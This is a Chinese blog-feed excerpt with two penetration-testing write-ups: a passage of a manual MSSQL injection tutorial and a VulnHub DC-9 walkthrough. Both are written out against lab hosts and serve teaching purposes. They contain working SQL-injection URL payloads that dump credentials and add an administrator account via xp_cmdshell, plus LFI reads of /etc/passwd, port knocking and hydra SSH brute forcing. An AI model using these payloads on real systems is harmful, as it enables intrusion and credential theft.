<code>sa</code> 权限！</p><h3 id="查看当前数据库版本"><a href="#查看当前数据库版本" class="headerlink" title="查看当前数据库版本"></a>查看当前数据库版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select @@version)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1364.png" alt="图片"></p><p>由上图可见，它的<code>Mssql</code>版本是：Microsoft SQL Server 2005 - 9.00.1399.06 (X64) .</p><p>这里为什么要加一个 <code>and 1=(select @@version)</code> 呢？是这样的，<code>and 1</code> 是<code>int</code>类型，它用了 <code>=</code> 后面的<code>(select @@version)</code> 是<code>字符类</code>型，那肯定是<code>不等于</code>啊，那么就会<code>报错</code>从而爆出相关查询信息。</p><p>这里为什么会报错呢？因为我们原本访问网站 <code>id=1</code> 查询的是数字类型<code>int</code>，而我们查询的是<code>字符类</code>型，所以他从字符类型<code>转换</code>为int类型<code>失败</code>就导致网站报错从而泄露网站的数据库版本信息！</p><p>实际上我们可以直接吧 <code>@@version</code> 放到 <code>id=</code>后面它也会被查询出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=@@version</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1365.png" alt="图片"></p><h3 id="查看当前数据库名称"><a href="#查看当前数据库名称" class="headerlink" title="查看当前数据库名称"></a>查看当前数据库名称</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select db_name())</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1366.png" alt="图片"></p><p>同理我们也可以使用这种方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=db_name()</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1367.png" alt="图片"></p><h3 id="获取第一个用户数据库的名称"><a href="#获取第一个用户数据库的名称" class="headerlink" title="获取第一个用户数据库的名称"></a>获取第一个用户数据库的名称</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1368.png" alt="图片"></p><p>由上图可见，我们爆出来的用户创建的<code>第一个</code>数据库名为 <code>test</code> 。</p><p><code>top 1</code> 是一个<code>SQL</code>查询的<code>子句</code>，它用于查询结果<code>只显示首条</code>记录。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">1</span> <span class="operator">*</span> <span class="keyword">FROM</span>的含义：</span><br><span class="line">　　<span class="number">1</span>、<span class="keyword">select</span>为命令动词，含义为执行数据查询操作；</span><br><span class="line">　　<span class="number">2</span>、top <span class="number">1</span>子句含义为查询结果只显示首条记录；</span><br><span class="line">　　<span class="number">3</span>、<span class="operator">*</span>子句表示查询结果包括数据源中的所有字段；</span><br><span class="line">　　<span class="number">4</span>、<span class="keyword">from</span>子句为指定数据源。</span><br></pre></td></tr></table></figure><p>对于 <code>master..sysdatabases</code> 这个意思是这样的：在<code>mssql</code>系统默认数据库<code>master</code> 的<code>系统视图</code>里有这些：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1369.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1370.png" alt="图片"></p><p>懂我意思吧？</p><p>这里我来解释一下后面的 <code>dbid&gt;4</code> 是什么意思：<code>mssql</code>是靠<code>dbid</code>来区分数据库名的！前面<code>4</code>个<code>id号</code>是默认<code>mssql</code>数据库<code>自带</code>的：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1371.png" alt="图片"></p><p>所以我们查询的时候需要从 <code>dbid</code>第<code>五</code>个开始查询，因为第<code>五</code>个就是用户所创建的<code>第一个数据库</code>，以此类推！</p><h3 id="获取第二个用户数据库的名称"><a href="#获取第二个用户数据库的名称" class="headerlink" title="获取第二个用户数据库的名称"></a>获取第二个用户数据库的名称</h3><p>因为刚刚我们爆出来<code>第一个数据库</code>的名称是 <code>test</code>，那么我们就可以使用下面的语句来查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name !=&#x27;test&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1372.png" alt="图片"></p><p>这里我来解释一下 ：<code>where dbid&gt;4 and name !=&#39;test&#39;</code> ，这条语句是说明条件是 <code>dbid&gt;4</code> 和 <code>name</code>名字<code>不等于</code>-<code>test</code>的数据库！这样一来我们查询到了第二个用户创建的数据库名为：<code>saulgoodman</code>！假如我们想要查询第三数据库名就可以按照这样的方式以此类推！</p><h4 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h4><p>使用这种个语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from master..sysdatabases where dbid&gt;5)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1373.png" alt="图片"></p><p>我们只需要把 <code>dbid&gt;4</code> 修改为 <code>dbid&gt;5</code> 就可以查询第二个数据库了！以此类推！</p><h3 id="小技巧-获取所有数据库的名字"><a href="#小技巧-获取所有数据库的名字" class="headerlink" title="(小技巧)获取所有数据库的名字"></a>(小技巧)获取所有数据库的名字</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select name from master..sysdatabases for xml path)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1374.png" alt="图片"></p><p>关于 <code>for xml path</code>的意思就是将查询结果集以<code>XML</code>形式展现！</p><p>具体可以参考这篇文章：<a href="https://blog.csdn.net/weixin_34379433/article/details/93652001">https://blog.csdn.net/weixin_34379433/article/details/93652001</a></p><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p>获取当前网站数据库所使用的<code>第一个表名</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1375.png" alt="图片"></p><p>由上图可知，我们获取到第一个表名是 <code>users</code>，如果想获取到<code>第二个表名</code>的话就可以这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27; and name !=&#x27;users&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1376.png" alt="图片"></p><p>这里我来说一下：<code>where xtype=&#39;u&#39; and name !=&#39;users&#39;</code> ，对于 <code>xtype</code> 我文章开头已经说过了，大家往前翻！后面的意思就是 <code>name</code> 不等于 <code>users</code> 表，那么就会查询下一个表名，这样我们就能获取到 <code>users</code> 表的下一个表名！想要获取到第三个表名就以此类推！</p><h3 id="小技巧-爆出所有表名"><a href="#小技巧-爆出所有表名" class="headerlink" title="(小技巧)爆出所有表名"></a>(小技巧)爆出所有表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select name from sysobjects for xml path)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1377.png" alt="图片"></p><p>和上面爆所有数据库名那个一样，简单粗暴！</p><h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><p>我们知道了表名是 <code>users</code> ，那么就可以利用下面的语句来爆 <code>users</code> 下面的列名:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;))</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1378.png" alt="图片"></p><p>获取下一个列名就可以这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;) and name !=&#x27;id&#x27;) </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1379.png" alt="图片"></p><p>依次类推我们爆出了下面这些列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;) and name !=&#x27;id&#x27; and name !=&#x27;username&#x27;  ) </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1380.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;) and name !=&#x27;id&#x27; and name !=&#x27;username&#x27;  and name !=&#x27;password&#x27;) </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1381.png" alt="图片"></p><p>这个时候我们就获取到了网站的表名：<code>users</code>，网站的列名：<code>id</code>，<code>username</code>、<code>password</code>。</p><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>获取账号 <code>username</code> 的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 username from users) </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1382.png" alt="图片"></p><p>想要获取<code>第二个</code>账号 <code>username</code> 的值那么就加一个条件语句 <code>where</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 password from users where id=2) </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1383.png" alt="图片"></p><p>依次类推爆出所有的用户名！</p><p>获取密码 <code>password</code> 的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 password from users) </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1384.png" alt="图片"></p><p>想要获取<code>第二个</code>密码 <code>password</code> 的值那么就加一个条件语句 <code>where</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 password from users where id=2) </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1385.png" alt="图片"></p><p>依次类推爆出所有的密码！</p><h3 id="Mssql手工注入另类玩法"><a href="#Mssql手工注入另类玩法" class="headerlink" title="Mssql手工注入另类玩法"></a>Mssql手工注入另类玩法</h3><p>因为我们刚才知道了网站的权限是 <code>sa</code> 权限，那么我们就可以干很多事，包括执行系统命令等等！</p><p><code>xp_cmdshell</code>：<code>SQL</code>中运行系统命令行的系统存储过程，一般在安全级别较高的服务器权限上。也就是它开启的话我们就可以执行系统命令！</p><h4 id="判断xp-cmdshell是否存在"><a href="#判断xp-cmdshell是否存在" class="headerlink" title="判断xp_cmdshell是否存在:"></a>判断<code>xp_cmdshell</code>是否存在:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name = &#x27;xp_cmdshell&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1386.png" alt="图片"></p><p>可以看到，页面返回正常，说明<code>xp_cmdshell</code>开启了的！</p><p><code>xp_cmdshell</code>默认在<code>mssql_2000</code>中是开启的，在<code>mssql_2005</code>之后的版本中则默认禁止。如果用户拥有管理员<code>sa</code>权限则可以用<code>sp_configure</code>重新开启它。</p><p>详细可看这篇文章：<a href="https://bbs.ichunqiu.com/thread-3221-1-1.html">https://bbs.ichunqiu.com/thread-3221-1-1.html</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">开启 xp_cmdshell：</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;reconfigure;</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span>;reconfigure;</span><br><span class="line">关闭 xp_cmdshell：</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;reconfigure;</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">0</span>;reconfigure</span><br></pre></td></tr></table></figure><h4 id="xp-cmdshell执行命令提权"><a href="#xp-cmdshell执行命令提权" class="headerlink" title="xp_cmdshell执行命令提权"></a>xp_cmdshell执行命令提权</h4><p>首先我们服务器上只有这些用户：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1387.png" alt="图片"></p><p>我们使用<code>xp_cmdshell</code>对他提权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 ;exec master..xp_cmdshell &quot;net user saul saul123 /add&quot;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1388.png" alt="图片"></p><p>页面返回正常说明执行成功！</p><p>我们吧 <code>saul</code> 用户添加到管理员组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1  ;exec master..xp_cmdshell &quot;net localgroup administrators saul /add&quot;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1389.png" alt="图片"></p><p>这个时候因为它的页面是不回显，那么我们来到服务器看看：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1390.png" alt="图片"></p><p>由上图可见，我们创建了一个 <code>saul</code> 用户到目标服务器提权成功了！接下来如果目标是外网那么我们就可以登录到它的远程桌面：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1391.png" alt="图片"></p><p>至此，MsSQL手工注入就讲到这里！如果大家有什么意见可以到我微信公众号反馈~</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MsSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-DC_9-Walkthrough</title>
      <link href="/2020/03/09/Vulnhub-DC-9/"/>
      <url>/2020/03/09/Vulnhub-DC-9/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=625568&auto=1&height=66"></iframe><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p><code>DC-9</code>是 <code>DC</code> 系列的最后一个靶机了，这项挑战的最终目标是扎根并读取唯一的标志。</p><p>这个靶机有点意思，是通过频繁的<code>爆破SSH</code>最终通过写入用户到 <code>passwd</code> 提权才拿到的Flag。</p><p>下载地址：<a href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a></p><h2 id="运用到的知识点"><a href="#运用到的知识点" class="headerlink" title="运用到的知识点"></a>运用到的知识点</h2><p><code>SQL注入</code>获取账号密码<br><code>LFI</code>本地文件包含漏洞<br><code>knockd</code>的保护<code>SSH</code>机制<br>绕过<code>knockd</code>限制暴力破解SSH<br>写入文件到<code>passwd</code>提权</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>获取到靶机 <code>IP</code> 后先对它进行端口扫描看看它开放了那些服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 192.168.1.148</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1323.png" alt="图片"></p><p>可以看到，靶机只开放了 <code>80</code>（http），而<code>22</code>（ssh）被过滤了！应该是做了防护！我们先来看看它的 <code>WEB</code> 服务吧：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1324.png" alt="图片"></p><p>通过查看它的页面我发现它的页面上有一些用户的信息：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1325.png" alt="图片"></p><p>还有搜索的提交页面：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1326.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1327.png" alt="图片"></p><h2 id="SQL注入获取账号密码"><a href="#SQL注入获取账号密码" class="headerlink" title="SQL注入获取账号密码"></a>SQL注入获取账号密码</h2><p>既然它搜索可以查询到相应到信息，那么说明它吧我们的条件带入数据库里查询了，很有可能会存在<code>SQL</code>注入！</p><p>按照我的思路，不管他三七二十一直接丢到<code>Sqlmap</code>里一顿梭哈！我先是使用<code>Burp</code>抓包：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1328.png" alt="图片"></p><p>把抓到的数据包保存到本地 <code>post.txt</code> 文件里：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1329.png" alt="图片"></p><p>最后丢到<code>Sqlmap</code>里跑发现是存在注入的：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1330.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1331.png" alt="图片"></p><p>最终获取到网站后台的管理员账号和密码<code>HASH</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt -D Staff -T Users -C Username,Password --dump</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1332.png" alt="图片"></p><p>通过解密得到了账号 <code>admin</code> 的密码为 <code>transorbital1</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1333.png" alt="图片"></p><h2 id="LFI本地文件包含漏洞"><a href="#LFI本地文件包含漏洞" class="headerlink" title="LFI本地文件包含漏洞"></a>LFI本地文件包含漏洞</h2><p>获取到账号和密码后登陆到了网站到页面，其中发现了 <code>manage.php</code> 页面底部有一个提示引起了我的注意：<code>File does not exist</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1334.png" alt="图片"></p><p>翻译过来就是文件未找到！这个时候脑子里第一时间想到的就是 <code>LFI</code>！后来通过我 <code>FUZZ</code> 发现真的是存在<code>本地文件包含</code>漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.148/manage.php?file=../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1335.png" alt="图片"></p><h2 id="绕过knockd限制暴力破解SSH"><a href="#绕过knockd限制暴力破解SSH" class="headerlink" title="绕过knockd限制暴力破解SSH"></a>绕过knockd限制暴力破解SSH</h2><p>可以看到我们可以查看 <code>passwd</code> 文件，而之前我们通过<code>sqlmap</code>获取到了一堆账号和密码，而那些账号和 <code>passwd</code> 里的账号是一样的！那么我们就可以利用获取到的账号和密码挨个去碰撞看看能不能登陆到它的 <code>SSH</code>！</p><p>我先是把账号和密码保存到了 <code>user</code> 和 <code>pass</code> 里：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1336.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1337.png" alt="图片"></p><p>保存完后我尝试使用 <code>Hydra</code> 去爆破发现它连接请求被拒绝了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user -P pass 192.168.1.148 ssh</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1338.png" alt="图片"></p><p>到了这里我们要知道关于 <code>SSH</code> 的三个机制：</p><p>如果需要远程访问计算机并启用了 Secure Shell (SSH) 连接，黑客就会尝试突破您的防线并控制您的计算机，您必须接受这个事实。尽管不能保证计算机不会被 “黑客” 占领，但是一些简单的解决方案有助于保护 SSH，可以让攻击困难一些。本文讨论三种技术：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、把 SSH 的标准端口改为不常用的值并增强 SSH 配置，从而挡住最简单的攻击。</span><br><span class="line">2、定义有限的用户列表，只允许这些用户登录。</span><br><span class="line">3、完全隐藏允许 SSH 访问的事实，要求根据特殊的 “敲门” 序列识别有效用户。</span><br></pre></td></tr></table></figure><p>首先进行排除法我们刚开始就对它进行端口扫描了，它只开放了两个端口，由此判断它的端口没有改变，排除一！</p><p>其次我们通过 <code>LFI</code> 发现 <code>passwd</code> 文件让我们得到了 <code>SSH</code> 的用户名，由此判断它的用户名是对的，排除二！</p><p>那么估计就是 <code>SSH</code> 被某些手段所隐藏了，我们需要根据特殊的“<code>敲门</code>”才能登陆到用户！<br>这个时候我通过查看了下面这篇文章找到了原因：</p><p><a href="https://zhuanlan.zhihu.com/p/43716885">https://zhuanlan.zhihu.com/p/43716885</a></p><p>如果你有一台公众可访问的服务器，黑客可以轻松扫描其IP地址，查找服务器上的开放端口(尤其是用于<code>SSH</code>的端口<code>22</code>)。将服务器隐藏起来、不让黑客看见的一种方法是使用<code>knockd</code>。<code>knockd</code>是一种端口试探服务器工具。它侦听以太网或其他可用接口上的所有流量，等待特殊序列的端口命中(<code>port-hit</code>)。<code>telne</code>t或<code>Putty</code>等客户软件通过向服务器上的端口发送<code>TCP</code>或数据包来启动端口命中。</p><p>既然知道了原理之后我们就知道了如何去应对它了！借助偶像猪猪侠的话：<code>只有对原理了然如心，你才能突破更多的限制！</code></p><p>如果目标服务器上按照了 <code>knockd</code> ，那么默认的配置文件就存放在 <code>/etc/knockd.conf</code> 里！那么我们就可以利用 <code>LFI</code> 去查看这个:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.148/manage.php?file=../../../../../..//etc/knockd.conf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn</span><br></pre></td></tr></table></figure><p>这个时候我们就得到了要“<code>敲门</code>”的序列号为：<code>7469</code>、<code>8475</code>、<code>9842</code>！紧接着我在 KALI 中安装了 <code>knockd</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install knockd</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1339.png" alt="图片"></p><p>安装完后我们只需要使用 <code>knockd</code> 进行“<code>敲门</code>”就可以使用 <code>hydra</code> 九头蛇爆破了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">knock 192.168.1.148 7469 8475 9842</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1340.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user -P pass 192.168.1.148 ssh</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1341.png" alt="图片"></p><p>这个时候就成功爆破出三个用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[22][ssh] host: 192.168.1.148   login: janitor   password: Ilovepeepee</span><br><span class="line">[22][ssh] host: 192.168.1.148   login: chandlerb   password: UrAG0D!</span><br><span class="line">[22][ssh] host: 192.168.1.148   login: joeyt   password: Passw0rd</span><br></pre></td></tr></table></figure><p>登陆到 <code>janitor</code> 用户后使用一些常规的提权操作后无果，但是我发现了一个隐藏目录，里面存放着一些密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic#10-4</span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1342.png" alt="图片"></p><p>很显然了作者想让我们<code>挨个去登陆</code>这些用户才能获取到 root ！我再次把收集到的密码放到 <code>pass</code> 文件里然后再次爆破：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1343.png" alt="图片"></p><p>回炉再造之后我们又得到了一个用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[22][ssh] host: 192.168.1.148   login: fredf   password: B4-Tru3-001</span><br></pre></td></tr></table></figure><p>登陆成功后我查看有没有那些 <code>sudo</code> 权限的命令发现了一个 <code>test</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1344.png" alt="图片"></p><p>尝试 <code>sudo</code> 运行这个文件发现它是一个 <code>python</code> 脚本：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1345.png" alt="图片"></p><h2 id="写入文件到passwd提权"><a href="#写入文件到passwd提权" class="headerlink" title="写入文件到passwd提权"></a>写入文件到passwd提权</h2><p>随后找到了这个文件所在的目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -name test.py 2&gt;/dev/null</span><br><span class="line"></span><br><span 